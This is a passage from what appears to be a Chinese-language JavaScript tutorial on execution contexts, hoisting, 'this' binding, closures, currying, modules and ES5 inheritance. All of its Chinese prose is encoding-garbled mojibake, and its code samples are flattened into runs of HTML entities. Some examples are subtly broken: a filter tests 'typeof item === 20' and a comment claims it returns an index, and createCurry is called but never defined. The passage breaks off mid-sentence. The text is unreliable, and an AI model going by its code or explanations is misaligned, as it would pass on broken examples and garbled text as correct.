Objectï¼‰å˜é‡å¯¹è±¡çš„åˆ›å»ºï¼Œä¾æ¬¡ç»åŽ†äº†ä»¥ä¸‹å‡ ä¸ªè¿‡ç¨‹ã€‚ å»ºç«‹argumentså¯¹è±¡ã€‚æ£€æŸ¥å½“å‰ä¸Šä¸‹æ–‡ä¸­çš„å‚æ•°ï¼Œå»ºç«‹è¯¥å¯¹è±¡ä¸‹çš„å±žæ€§ä¸Žå±žæ€§å€¼ã€‚ æ£€æŸ¥å½“å‰ä¸Šä¸‹æ–‡çš„å‡½æ•°å£°æ˜Žï¼Œä¹Ÿå°±æ˜¯ä½¿ç”¨functionå…³é”®å­—å£°æ˜Žçš„å‡½æ•°ã€‚åœ¨å˜é‡å¯¹è±¡ä¸­ä»¥å‡½æ•°åå»ºç«‹ä¸€ä¸ªå±žæ€§ï¼Œå±žæ€§å€¼ä¸ºæŒ‡å‘è¯¥å‡½æ•°æ‰€åœ¨å†…å­˜åœ°å€çš„å¼•ç”¨ã€‚å¦‚æžœå‡½æ•°åçš„å±žæ€§å·²ç»å­˜åœ¨ï¼Œé‚£ä¹ˆè¯¥å±žæ€§å°†ä¼šè¢«æ–°çš„å¼•ç”¨æ‰€è¦†ç›–ã€‚ æ£€æŸ¥å½“å‰ä¸Šä¸‹æ–‡ä¸­çš„å˜é‡å£°æ˜Žï¼Œæ¯æ‰¾åˆ°ä¸€ä¸ªå˜é‡å£°æ˜Žï¼Œå°±åœ¨å˜é‡å¯¹è±¡ä¸­ä»¥å˜é‡åå»ºç«‹ä¸€ä¸ªå±žæ€§ï¼Œå±žæ€§å€¼ä¸ºundefinedã€‚å¦‚æžœè¯¥å˜é‡åçš„å±žæ€§å·²ç»å­˜åœ¨ï¼Œä¸ºäº†é˜²æ­¢åŒåçš„å‡½æ•°è¢«ä¿®æ”¹ä¸ºundefinedï¼Œåˆ™ä¼šç›´æŽ¥è·³è¿‡ï¼ŒåŽŸå±žæ€§å€¼ä¸ä¼šè¢«ä¿®æ”¹ã€‚ 12345678910// demo01function test() &#123; console.log(a); console.log(foo()); var a = 1; function foo() &#123; return 2; &#125;&#125;test(); å…¨å±€ä½œç”¨åŸŸä¸­è¿è¡Œtest()æ—¶ï¼Œtest()çš„æ‰§è¡Œä¸Šä¸‹æ–‡å¼€å§‹åˆ›å»ºã€‚ 12345678910111213// åˆ›å»ºè¿‡ç¨‹testEC = &#123; // å˜é‡å¯¹è±¡ VO: &#123;&#125;, scopeChain: &#123;&#125;&#125;// å› ä¸ºæœ¬æ–‡æš‚æ—¶ä¸è¯¦ç»†è§£é‡Šä½œç”¨åŸŸé“¾ï¼Œæ‰€ä»¥æŠŠå˜é‡å¯¹è±¡ä¸“é—¨æå‡ºæ¥è¯´æ˜Ž// VO ä¸º Variable Objectçš„ç¼©å†™ï¼Œå³å˜é‡å¯¹è±¡VO = &#123; arguments: &#123;...&#125;, //æ³¨ï¼šåœ¨æµè§ˆå™¨çš„å±•ç¤ºä¸­ï¼Œå‡½æ•°çš„å‚æ•°å¯èƒ½å¹¶ä¸æ˜¯æ”¾åœ¨argumentså¯¹è±¡ä¸­ï¼Œè¿™é‡Œä¸ºäº†æ–¹ä¾¿ç†è§£ï¼Œæˆ‘åšäº†è¿™æ ·çš„å¤„ç† foo: &lt;foo reference&gt; // è¡¨ç¤ºfooçš„åœ°å€å¼•ç”¨ a: undefined&#125; æœªè¿›å…¥æ‰§è¡Œé˜¶æ®µä¹‹å‰ï¼Œå˜é‡å¯¹è±¡ä¸­çš„å±žæ€§éƒ½ä¸èƒ½è®¿é—®ï¼ä½†æ˜¯è¿›å…¥æ‰§è¡Œé˜¶æ®µä¹‹åŽï¼Œå˜é‡å¯¹è±¡è½¬å˜ä¸ºäº†æ´»åŠ¨å¯¹è±¡ï¼Œé‡Œé¢çš„å±žæ€§éƒ½èƒ½è¢«è®¿é—®äº†ï¼Œç„¶åŽå¼€å§‹è¿›è¡Œæ‰§è¡Œé˜¶æ®µçš„æ“ä½œã€‚ å˜é‡å¯¹è±¡å’Œæ´»åŠ¨å¯¹è±¡æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Œä»–ä»¬å…¶å®žéƒ½æ˜¯åŒä¸€ä¸ªå¯¹è±¡ï¼Œåªæ˜¯å¤„äºŽæ‰§è¡Œä¸Šä¸‹æ–‡çš„ä¸åŒç”Ÿå‘½å‘¨æœŸã€‚ä¸è¿‡åªæœ‰å¤„äºŽå‡½æ•°è°ƒç”¨æ ˆæ ˆé¡¶çš„æ‰§è¡Œä¸Šä¸‹æ–‡ä¸­çš„å˜é‡å¯¹è±¡ï¼Œæ‰ä¼šå˜æˆæ´»åŠ¨å¯¹è±¡ã€‚ 12345678// æ‰§è¡Œé˜¶æ®µVO -&gt; AO // Active ObjectAO = &#123; arguments: &#123;...&#125;, foo: &lt;foo reference&gt;, a: 1, this: Window&#125; å› æ­¤ï¼Œä¸Šé¢çš„ä¾‹å­demo1ï¼Œæ‰§è¡Œé¡ºåºå°±å˜æˆäº†è¿™æ · 12345678910function test() &#123; function foo() &#123; return 2; &#125; var a; console.log(a); console.log(foo()); a = 1;&#125;test(); 1234567891011121314151617181920212223242526272829303132333435// demo2function test() &#123; console.log(foo); console.log(bar); var foo = 'Hello'; console.log(foo); var bar = function () &#123; return 'world'; &#125;//var å£°æ˜Žåªæå‡var bar function foo() &#123; return 'hello'; &#125;&#125;test();//Æ’ foo() &#123;// return 'hello';// &#125;//VM157:3 undefined//VM157:6 Hello// åˆ›å»ºé˜¶æ®µVO = &#123; arguments: &#123;...&#125;, foo: &lt;foo reference&gt;, bar: undefined&#125;// è¿™é‡Œæœ‰ä¸€ä¸ªéœ€è¦æ³¨æ„çš„åœ°æ–¹ï¼Œå› ä¸ºvarå£°æ˜Žçš„å˜é‡å½“é‡åˆ°åŒåçš„å±žæ€§æ—¶ï¼Œä¼šè·³è¿‡è€Œä¸ä¼šè¦†ç›–// æ‰§è¡Œé˜¶æ®µVO -&gt; AOVO = &#123; arguments: &#123;...&#125;, foo: 'Hello', bar: &lt;bar reference&gt;, this: Window&#125; thisthisçš„æŒ‡å‘ï¼Œæ˜¯åœ¨å‡½æ•°è¢«è°ƒç”¨çš„æ—¶å€™ç¡®å®šçš„ã€‚ä¹Ÿå°±æ˜¯æ‰§è¡Œä¸Šä¸‹æ–‡è¢«åˆ›å»ºæ—¶ç¡®å®šçš„ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œåœ¨å‡½æ•°æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œthisä¸€æ—¦è¢«ç¡®å®šï¼Œå°±ä¸å¯æ›´æ”¹äº†ã€‚è¿è¡ŒåŽä¼šæŠ¥é”™ éšå¼ç»‘å®š&lt;æ˜¾å¼ç»‘å®š&lt;newç»‘å®š ä½¿ç”¨callï¼Œapplyæ˜¾ç¤ºæŒ‡å®šthis JavaScriptå†…éƒ¨æä¾›äº†ä¸€ç§æœºåˆ¶ï¼Œè®©æˆ‘ä»¬å¯ä»¥è‡ªè¡Œæ‰‹åŠ¨è®¾ç½®thisçš„æŒ‡å‘ã€‚å®ƒä»¬å°±æ˜¯callä¸Žapplyã€‚æ‰€æœ‰çš„å‡½æ•°éƒ½å…·æœ‰ç€ä¸¤ä¸ªæ–¹æ³•ã€‚å®ƒä»¬é™¤äº†å‚æ•°ç•¥æœ‰ä¸åŒï¼Œå…¶åŠŸèƒ½å®Œå…¨ä¸€æ ·ã€‚å®ƒä»¬çš„ç¬¬ä¸€ä¸ªå‚æ•°éƒ½ä¸ºthiså°†è¦æŒ‡å‘çš„å¯¹è±¡ã€‚ ç®­å¤´å‡½æ•°ä¸é€‚ç”¨thisçš„å››ç§æ ‡å‡†è§„åˆ™ï¼Œè€Œæ˜¯æ ¹æ®å¤–å±‚ï¼ˆå‡½æ•°æˆ–åˆ™å…¨å±€ï¼‰ä½œç”¨åŸŸæ¥å†³å®šthisï¼Œç®­å¤´å‡½æ•°çš„ç»‘å®šæ— æ³•è¢«ä¿®æ”¹ï¼ˆnewä¹Ÿä¸è¡Œï¼‰ 123456789function foo()ï½› return (a) =&gt; &#123; console.log(this.a); &#125;&#125;var obj1 = &#123;a:2&#125;;var obj2 = &#123;a:3&#125;;var bar = foo.call(obj1);//foo()å†…éƒ¨åˆ›å»ºçš„ç®­å¤´å‡½æ•°ä¼šæ•èŽ·è°ƒç”¨æ—¶foo()çš„thisbar.call(obj2);//2ï¼Œä¸æ˜¯3,ç”±äºŽfoo()çš„thisç»‘å®šåˆ°obj1ï¼Œbarï¼ˆå¼•ç”¨ç®­å¤´å‡½æ•°ï¼‰çš„thisä¹Ÿä¼šç»‘å®šåˆ°obj1 é—­åŒ…ï¼ˆClosureï¼‰ä»€ä¹ˆæ˜¯é—­åŒ… é—­åŒ…æ˜¯å‡½æ•°å’Œå£°æ˜Žè¯¥å‡½æ•°çš„è¯æ³•çŽ¯å¢ƒçš„ç»„åˆã€‚â€“MDN é—­åŒ…æ¡ä»¶ å‡½æ•°åµŒå¥— å†…éƒ¨å‡½æ•°å¼•ç”¨å¤–éƒ¨å‡½æ•°çš„å±€éƒ¨å˜é‡ ä¼˜ç‚¹ å»¶é•¿å¤–éƒ¨å‡½æ•°å±€éƒ¨å˜é‡çš„ç”Ÿå‘½å‘¨æœŸ ç¼ºç‚¹ å†…å­˜æ³„æ¼ è§£å†³ ç”¨åŽŸåž‹ä»£æ›¿ â€‹ åŠæ—¶é”€æ¯ 1234567function f1()&#123; let i = 0; return ()=&gt;&#123; console.log(i) ++i &#125;&#125; é—­åŒ…æ˜¯åœ¨å‡½æ•°è¢«è°ƒç”¨æ‰§è¡Œçš„æ—¶å€™æ‰è¢«ç¡®è®¤åˆ›å»ºçš„ã€‚ é—­åŒ…çš„å½¢æˆï¼Œä¸Žä½œç”¨åŸŸé“¾çš„è®¿é—®é¡ºåºæœ‰ç›´æŽ¥å…³ç³»ã€‚ åªæœ‰å†…éƒ¨å‡½æ•°è®¿é—®äº†ä¸Šå±‚ä½œç”¨åŸŸé“¾ä¸­çš„å˜é‡å¯¹è±¡æ—¶ï¼Œæ‰ä¼šå½¢æˆé—­åŒ…ï¼Œå› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨é—­åŒ…æ¥è®¿é—®å‡½æ•°å†…éƒ¨çš„å˜é‡ã€‚ æŸ¯é‡ŒåŒ–å‡½æ•°å‡½æ•°æŸ¯é‡ŒåŒ–æ˜¯æŠŠæŽ¥å—å¤šä¸ªå‚æ•°çš„å‡½æ•°å˜æ¢æˆæŽ¥å—ä¸€ä¸ªå•ä¸€å‚æ•°ï¼ˆæœ€åˆå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼‰çš„å‡½æ•°ï¼Œå¹¶ä¸”è¿”å›žæŽ¥å—ä½™ä¸‹çš„å‚æ•°è€Œä¸”è¿”å›žç»“æžœçš„æ–°å‡½æ•°çš„æŠ€æœ¯ã€‚ å‡½æ•°æŸ¯é‡ŒåŒ–çš„ä¸»è¦ä½œç”¨ï¼š å‚æ•°å¤ç”¨ æå‰è¿”å›ž â€“ è¿”å›žæŽ¥å—ä½™ä¸‹çš„å‚æ•°ä¸”è¿”å›žç»“æžœçš„æ–°å‡½æ•° å»¶è¿Ÿæ‰§è¡Œ â€“ è¿”å›žæ–°å‡½æ•°ï¼Œç­‰å¾…æ‰§è¡Œ 1234567891011121314const curry = (fn, ...args) =&gt; args.length &lt; fn.length //å‚æ•°é•¿åº¦ä¸è¶³æ—¶ï¼Œé€’å½’è°ƒç”¨æŸ¯é‡ŒåŒ–ï¼Œç­‰å¾…æŽ¥å—æ–°å‚æ•° ? (...arguments) =&gt; curry(fn, ...args, ...arguments) //å‚æ•°é•¿åº¦æ»¡è¶³æ—¶ï¼Œæ‰§è¡Œå‡½æ•° : fn(...args);function sumFn(a, b, c) &#123; return a + b + c;&#125;var sum = curry(sumFn);console.log(sum(2)(3)(5));//10console.log(sum(2, 3, 5));//10console.log(sum(2)(3, 5));//10console.log(sum(2, 3)(5));//10 æ™®é€šæ€ç»´ä¸‹æˆ‘ä»¬å¯ä»¥è¿™æ ·æ¥å°è£…ã€‚ 123456function getNewArray(array) &#123; return array.map(function(item) &#123; return item * 100 + '%' &#125;)&#125;getNewArray([1, 2, 3, 0.12]); // ['100%', '200%', '300%', '12%']; è€Œå¦‚æžœå€ŸåŠ©æŸ¯é‡ŒåŒ–æ¥äºŒæ¬¡å°è£…è¿™æ ·çš„é€»è¾‘ï¼Œåˆ™ä¼šå¦‚ä¸‹å®žçŽ°ï¼š 123456789function _map(func, array) &#123; return array.map(func);&#125;var _getNewArray = createCurry(_map);var getNewArray = _getNewArray(function(item) &#123; return item * 100 + '%'&#125;)getNewArray([1, 2, 3, 0.12]); // ['100%', '200%', '300%', '12%'];getNewArray([0.01, 1]); // ['1%', '100%'] å¦‚æžœæˆ‘ä»¬çš„é¡¹ç›®ä¸­çš„å›ºå®šæ“ä½œæ˜¯å¸Œæœ›å¯¹æ•°ç»„è¿›è¡Œä¸€ä¸ªè¿‡æ»¤ï¼Œæ‰¾å‡ºæ•°ç»„ä¸­çš„æ‰€æœ‰Numberç±»åž‹çš„æ•°æ®ã€‚å€ŸåŠ©æŸ¯é‡ŒåŒ–æ€ç»´æˆ‘ä»¬å¯ä»¥è¿™æ ·åšã€‚ 12345678910111213141516171819202122232425function _filter(func, array) &#123; return array.filter(func);&#125;var _find = createCurry(_filter);var findNumber = _find(function(item) &#123; if (typeof item == 'number') &#123; return item; &#125;&#125;)findNumber([1, 2, 3, '2', '3', 4]); // [1, 2, 3, 4]// å½“æˆ‘ä»¬ç»§ç»­å°è£…å¦å¤–çš„è¿‡æ»¤æ“ä½œæ—¶å°±ä¼šå˜å¾—éžå¸¸ç®€å•// æ‰¾å‡ºæ•°å­—ä¸º20çš„å­é¡¹var find20 = _find(function(item, i) &#123; if (typeof item === 20) &#123; return i; &#125;&#125;)find20([1, 2, 3, 30, 20, 100]); // 4// æ‰¾å‡ºæ•°ç»„ä¸­å¤§äºŽ100çš„æ‰€æœ‰æ•°æ®var findGreater100 = _find(function(item) &#123; if (item &gt; 100) &#123; return item; &#125;&#125;)findGreater100([1, 2, 101, 300, 2, 122]); // [101, 300, 122] æ— é™å‚æ•°çš„æŸ¯é‡ŒåŒ–1234// å®žçŽ°ä¸€ä¸ªaddæ–¹æ³•ï¼Œä½¿è®¡ç®—ç»“æžœèƒ½å¤Ÿæ»¡è¶³å¦‚ä¸‹é¢„æœŸï¼šadd(1)(2)(3) = 6;add(1, 2, 3)(4) = 10;add(1)(2)(3)(4)(5) = 15; addæ–¹æ³•çš„å®žçŽ°ä»ç„¶ä¼šæ˜¯ä¸€ä¸ªå‚æ•°çš„æ”¶é›†è¿‡ç¨‹ã€‚å½“addå‡½æ•°æ‰§è¡Œåˆ°æœ€åŽæ—¶ï¼Œä»ç„¶è¿”å›žçš„æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡å®šä¹‰toString/valueOfçš„æ–¹å¼ï¼Œè®©è¿™ä¸ªå‡½æ•°å¯ä»¥ç›´æŽ¥å‚ä¸Žè®¡ç®—ï¼Œå¹¶ä¸”è½¬æ¢çš„ç»“æžœæ˜¯æˆ‘ä»¬æƒ³è¦çš„ã€‚è€Œä¸”å®ƒæœ¬èº«ä¹Ÿä»ç„¶å¯ä»¥ç»§ç»­æ‰§è¡ŒæŽ¥æ”¶æ–°çš„å‚æ•°ã€‚å®žçŽ°æ–¹å¼å¦‚ä¸‹ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142function add() &#123; // ç¬¬ä¸€æ¬¡æ‰§è¡Œæ—¶ï¼Œå®šä¹‰ä¸€ä¸ªæ•°ç»„ä¸“é—¨ç”¨æ¥å­˜å‚¨æ‰€æœ‰çš„å‚æ•° var _args = [].slice.call(arguments); // åœ¨å†…éƒ¨å£°æ˜Žä¸€ä¸ªå‡½æ•°ï¼Œåˆ©ç”¨é—­åŒ…çš„ç‰¹æ€§ä¿å­˜_argså¹¶æ”¶é›†æ‰€æœ‰çš„å‚æ•°å€¼ var adder = function () &#123; var _adder = function() &#123; // [].push.apply(_args, [].slice.call(arguments)); _args.push(...arguments); return _adder; &#125;; // åˆ©ç”¨éšå¼è½¬æ¢çš„ç‰¹æ€§ï¼Œå½“æœ€åŽæ‰§è¡Œæ—¶éšå¼è½¬æ¢ï¼Œå¹¶è®¡ç®—æœ€ç»ˆçš„å€¼è¿”å›ž _adder.toString = function () &#123; return _args.reduce(function (a, b) &#123; return a + b; &#125;); &#125; return _adder; &#125; // return adder.apply(null, _args); return adder(..._args);&#125;var a = add(1)(2)(3)(4); // f 10var b = add(1, 2, 3, 4); // f 10var c = add(1, 2)(3, 4); // f 10var d = add(1, 2, 3)(4); // f 10// å¯ä»¥åˆ©ç”¨éšå¼è½¬æ¢çš„ç‰¹æ€§å‚ä¸Žè®¡ç®—console.log(a + 10); // 20console.log(b + 20); // 30console.log(c + 30); // 40console.log(d + 40); // 50// ä¹Ÿå¯ä»¥ç»§ç»­ä¼ å…¥å‚æ•°ï¼Œå¾—åˆ°çš„ç»“æžœå†æ¬¡åˆ©ç”¨éšå¼è½¬æ¢å‚ä¸Žè®¡ç®—console.log(a(10) + 100); // 120console.log(b(10) + 100); // 120console.log(c(10) + 100); // 120console.log(d(10) + 100); // 120// å…¶å®žä¸Šæ —ä¸­çš„addæ–¹æ³•ï¼Œå°±æ˜¯ä¸‹é¢è¿™ä¸ªå‡½æ•°çš„æŸ¯é‡ŒåŒ–å‡½æ•°ï¼Œåªä¸è¿‡æˆ‘ä»¬å¹¶æ²¡æœ‰ä½¿ç”¨é€šç”¨å¼æ¥è½¬åŒ–ï¼Œè€Œæ˜¯è‡ªå·±å°è£…function add(...args) &#123; return args.reduce((a, b) =&gt; a + b);&#125; æ¨¡å—åŒ–æ¨¡å—æ˜¯é—­åŒ…æœ€å¼ºå¤§çš„ä¸€ä¸ªåº”ç”¨åœºæ™¯ 1234567891011(function () &#123; var a = 10; var b = 20; function add(num1, num2) &#123; var num1 = !!num1 ? num1 : a; var num2 = !!num2 ? num2 : b; return num1 + num2; &#125; window.add = add;&#125;)();add(10, 20); ä½¿ç”¨å‡½æ•°è‡ªæ‰§è¡Œçš„æ–¹å¼ï¼Œåˆ›å»ºäº†ä¸€ä¸ªæ¨¡å—ã€‚addæ˜¯æ¨¡å—å¯¹å¤–æš´éœ²çš„ä¸€ä¸ªå…¬å…±æ–¹æ³•ã€‚è€Œå˜é‡aï¼Œbè¢«ä½œä¸ºç§æœ‰å˜é‡ã€‚ é¢å‘å¯¹è±¡ç»§æ‰¿ æž„é€ å‡½æ•°çš„prototypeä¸Žæ‰€æœ‰å®žä¾‹å¯¹è±¡çš„__proto__éƒ½æŒ‡å‘åŽŸåž‹å¯¹è±¡ã€‚è€ŒåŽŸåž‹å¯¹è±¡çš„constructoræŒ‡å‘æž„é€ å‡½æ•°ã€‚ ES5new æ“ä½œç¬¦æ–°å»ºäº†ä¸€ä¸ªç©ºå¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡åŽŸåž‹æŒ‡å‘æž„é€ å‡½æ•°çš„prototypeï¼Œæ‰§è¡Œæž„é€ å‡½æ•°åŽè¿”å›žè¿™ä¸ªå¯¹è±¡ã€‚ 1. åŽŸåž‹é“¾ç»§æ‰¿åŽŸåž‹é“¾ç»§æ‰¿çš„åŸºæœ¬æ€æƒ³æ˜¯åˆ©ç”¨åŽŸåž‹è®©ä¸€ä¸ªå¼•ç”¨ç±»åž‹ç»§æ‰¿å¦ä¸€ä¸ªå¼•ç”¨ç±»åž‹çš„å±žæ€§å’Œæ–¹æ³•ã€‚ 123456789101112131415161718192021function SuperType() &#123; this.name = &apos;Yvette&apos;; this.colors = [&apos;pink&apos;, &apos;blue&apos;, &apos;green&apos;];&#125;SuperType.prototype.getName = function () &#123; return this.name;&#125;function SubType() &#123; this.age = 22;&#125;SubType.prototype = new SuperType();SubType.prototype.getAge = function() &#123; return this.age;&#125;SubType.prototype.constructor = SubType;let instance1 = new SubType();instance1.colors.push(&apos;yellow&apos;);console.log(instance1.getName()); //&apos;Yvette&apos;console.log(instance1.colors);//[ &apos;pink&apos;, &apos;blue&apos;, &apos;green&apos;, &apos;yellow&apos; ]let instance2 = new SubType();console.log(instance2.colors);//[ &apos;pink&apos;, &apos;blue&apos;, &apos;green&apos;, &apos;yellow&apos; ] ç¼ºç‚¹ï¼š é€šè¿‡åŽŸåž‹æ¥å®žçŽ°ç»§æ‰¿æ—¶ï¼ŒåŽŸåž‹ä¼šå˜æˆå¦ä¸€ä¸ªç±»åž‹çš„å®žä¾‹ï¼ŒåŽŸå…ˆçš„å®žä¾‹å±žæ€§å˜æˆäº†çŽ°åœ¨çš„åŽŸåž‹å±žæ€§ï¼Œè¯¥åŽŸåž‹çš„å¼•ç”¨ç±»åž‹å±žæ€§ä¼šè¢«æ‰€æœ‰çš„å®žä¾‹å…±äº«ã€‚ åœ¨åˆ›å»ºå­ç±»åž‹çš„å®žä¾‹æ—¶ï¼Œæ²¡æœ‰åŠžæ³•åœ¨ä¸å½±å“æ‰€æœ‰å¯¹è±¡å®žä¾‹çš„æƒ…å†µä¸‹ç»™è¶…ç±»åž‹çš„æž„é€ å‡½æ•°ä¸­ä¼ é€’å‚æ•°ã€‚ 2. å€Ÿç”¨æž„é€ å‡½æ•°å€Ÿç”¨æž„é€ å‡½æ•°çš„æŠ€æœ¯ï¼Œå…¶åŸºæœ¬æ€æƒ³ä¸º: åœ¨å­ç±»åž‹çš„æž„é€ å‡½æ•°ä¸­è°ƒç”¨è¶…ç±»åž‹æž„é€ å‡½æ•°ã€‚ 1function SuperType(name) &#123; this.name = name; this.colors = [&apos;pink&apos;, &apos;blue&apos;, &apos;green&apos;];&#125;function SubType(name) &#123; SuperType.call(this, name);&#125;let instance1 = new SubType(&apos;Yvette&apos;);instance1.colors.push(&apos;yellow&apos;);console.log(instance1.colors);//[&apos;pink&apos;, &apos;blue&apos;, &apos;green&apos;, yellow]let instance2 = new SubType(&apos;Jack&apos;);console.log(instance2.colors); //[&apos;pink&apos;, &apos;blue&apos;, &apos;green&apos;] ä¼˜ç‚¹: å¯ä»¥å‘è¶…ç±»ä¼ é€’å‚æ•° è§£å†³äº†åŽŸåž‹ä¸­åŒ…å«å¼•ç”¨ç±»åž‹å€¼è¢«æ‰€æœ‰å®žä¾‹å…±äº«çš„é—®é¢˜ ç¼ºç‚¹: æ–¹æ³•éƒ½åœ¨æž„é€ å‡½æ•°ä¸­å®šä¹‰ï¼Œå‡½æ•°å¤ç”¨æ— ä»Žè°ˆèµ·ï¼Œå¦å¤–è¶…ç±»åž‹åŽŸåž‹ä¸­å®šä¹‰çš„æ–¹æ³•å¯¹äºŽå­ç±»åž‹è€Œè¨€éƒ½æ˜¯ä¸å¯è§çš„ã€‚ 3. ç»„åˆç»§æ‰¿(åŽŸåž‹é“¾ + å€Ÿç”¨æž„é€ å‡½æ•°)ç»„åˆç»§æ‰¿æŒ‡çš„æ˜¯å°†åŽŸåž‹é“¾å’Œå€Ÿç”¨æž„é€ å‡½æ•°æŠ€æœ¯ç»„åˆåˆ°ä¸€å—ï¼Œä»Žè€Œå‘æŒ¥äºŒè€…ä¹‹é•¿çš„ä¸€ç§ç»§æ‰¿æ¨¡å¼ã€‚åŸºæœ¬æ€è·¯ï¼š ä½¿ç”¨åŽŸåž‹é“¾å®žçŽ°å¯¹åŽŸåž‹å±žæ€§å’Œæ–¹æ³•çš„ç»§æ‰¿ï¼Œé€šè¿‡å€Ÿç”¨æž„é€ å‡½æ•°æ¥å®žçŽ°å¯¹å®žä¾‹å±žæ€§çš„ç»§æ‰¿ï¼Œæ—¢é€šè¿‡åœ¨åŽŸåž‹ä¸Šå®šä¹‰æ–¹æ³•æ¥å®žçŽ°äº†å‡½æ•°å¤ç”¨ï¼Œåˆä¿è¯äº†æ¯ä¸ªå®žä¾‹éƒ½æœ‰è‡ªå·±çš„å±žæ€§ã€‚ 1function SuperType(name) &#123; this.name = name; this.colors = [&apos;pink&apos;, &apos;blue&apos;, &apos;green&apos;];&#125;SuperType.prototype.sayName = function () &#123; console.log(this.name);&#125;function SuberType(name, age) &#123; SuperType.call(this, name); this.age = age;&#125;SuberType.prototype = new SuperType();SuberType.prototype.constructor = SuberType;SuberType.prototype.sayAge = function () &#123; console.log(this.age);&#125;let instance1 = new SuberType(&apos;Yvette&apos;, 20);instance1.colors.push(&apos;yellow&apos;);console.log(instance1.colors); //[ &apos;pink&apos;, &apos;blue&apos;, &apos;green&apos;, &apos;yellow&apos; ]instance1.sayName(); //Yvettelet instance2 = new SuberType(&apos;Jack&apos;, 22);console.log(instance2.colors); //[ &apos;pink&apos;, &apos;blue&apos;, &apos;green&apos; ]instance2.sayName();//Jack ç¼ºç‚¹: æ— è®ºä»€ä¹ˆæƒ…å†µä¸‹ï¼Œéƒ½ä¼šè°ƒç”¨ä¸¤æ¬¡è¶…ç±»åž‹æž„é€ å‡½æ•°ï¼šä¸€æ¬¡æ˜¯åœ¨åˆ›å»ºå­ç±»åž‹åŽŸåž‹çš„æ—¶å€™ï¼Œå¦ä¸€æ¬¡æ˜¯åœ¨å­ç±»åž‹æž„é€ å‡½æ•°å†…éƒ¨ã€‚ ä¼˜ç‚¹: å¯ä»¥å‘è¶…ç±»ä¼ é€’å‚æ•° æ¯ä¸ªå®žä¾‹éƒ½æœ‰è‡ªå·±çš„å±žæ€§ å®žçŽ°äº†å‡½æ•°å¤ç”¨ 4. åŽŸåž‹å¼ç»§æ‰¿åŽŸåž‹ç»§æ‰¿çš„åŸºæœ¬æ€æƒ³ï¼š å€ŸåŠ©åŽŸåž‹å¯ä»¥åŸºäºŽå·²æœ‰çš„å¯¹è±¡åˆ›å»ºæ–°å¯¹è±¡ï¼ŒåŒæ—¶è¿˜ä¸å¿…å› æ­¤åˆ›å»ºè‡ªå®šä¹‰ç±»åž‹ã€‚ 1function object(o) &#123; function F() &#123; &#125; F.prototype = o; return new F();&#125; åœ¨ object() å‡½æ•°å†…éƒ¨ï¼Œå…ˆç©¿ç”²ä¸€ä¸ªä¸´æ—¶æ€§çš„æž„é€ å‡½æ•°ï¼Œç„¶åŽå°†ä¼ å…¥çš„å¯¹è±¡ä½œä¸ºè¿™ä¸ªæž„é€ å‡½æ•°çš„åŽŸåž‹ï¼Œæœ€åŽè¿”å›žäº†è¿™ä¸ªä¸´æ—¶ç±»åž‹çš„ä¸€ä¸ªæ–°å®žä¾‹ï¼Œä»Žæœ¬è´¨ä¸Šè®²ï¼Œobject() å¯¹ä¼ å…¥çš„å¯¹è±¡æ‰§è¡Œäº†ä¸€æ¬¡æµ…æ‹·è´ã€‚ ECMAScript5é€šè¿‡æ–°å¢ž Object.create()æ–¹æ³•è§„èŒƒäº†åŽŸåž‹å¼ç»§æ‰¿ã€‚è¿™ä¸ªæ–¹æ³•æŽ¥æ”¶ä¸¤ä¸ªå‚æ•°ï¼šä¸€ä¸ªç”¨ä½œæ–°å¯¹è±¡åŽŸåž‹çš„å¯¹è±¡å’Œï¼ˆå¯é€‰çš„ï¼‰ä¸€ä¸ªä¸ºæ–°å¯¹è±¡å®šä¹‰é¢å¤–å±žæ€§çš„å¯¹è±¡(å¯ä»¥è¦†ç›–åŽŸåž‹å¯¹è±¡ä¸Šçš„åŒåå±žæ€§)ï¼Œåœ¨ä¼ å…¥ä¸€ä¸ªå‚æ•°çš„æƒ…å†µä¸‹ï¼ŒObject.create() å’Œ object() æ–¹æ³•çš„è¡Œä¸ºç›¸åŒã€‚ 1var person = &#123; name: &apos;Yvette&apos;, hobbies: [&apos;reading&apos;, &apos;photography&apos;]&#125;var person1 = Object.create(person);person1.name = &apos;Jack&apos;;person1.hobbies.push(&apos;coding&apos;);var person2 = Object.create(person);person2.name = &apos;Echo&apos;;person2.hobbies.push(&apos;running&apos;);console.log(person.hobbies);//[ &apos;reading&apos;, &apos;photography&apos;, &apos;coding&apos;, &apos;running&apos; ]console.log(person1.hobbies);//[ &apos;reading&apos;, &apos;photography&apos;, &apos;coding&apos;, &apos;running&apos; ] åœ¨æ²¡æœ‰å¿…è¦åˆ›å»ºæž„é€ å‡½æ•°ï¼Œä»…è®©ä¸€ä¸ªå¯¹è±¡ä¸Žå¦ä¸€ä¸ªå¯¹è±¡ä¿æŒç›¸ä¼¼çš„æƒ…å†µä¸‹ï¼ŒåŽŸåž‹å¼ç»§æ‰¿æ˜¯å¯ä»¥èƒœä»»çš„ã€‚ ç¼ºç‚¹: åŒåŽŸåž‹é“¾å®žçŽ°ç»§æ‰¿ä¸€æ ·ï¼ŒåŒ…å«å¼•ç”¨ç±»åž‹å€¼çš„å±žæ€§ä¼šè¢«æ‰€æœ‰å®žä¾‹å…±äº«ã€‚ 5. å¯„ç”Ÿå¼ç»§æ‰¿å¯„ç”Ÿå¼ç»§æ‰¿æ˜¯ä¸ŽåŽŸåž‹å¼ç»§æ‰¿ç´§å¯†ç›¸å…³çš„ä¸€ç§æ€è·¯ã€‚å¯„ç”Ÿå¼ç»§æ‰¿çš„æ€è·¯ä¸Žå¯„ç”Ÿæž„é€ 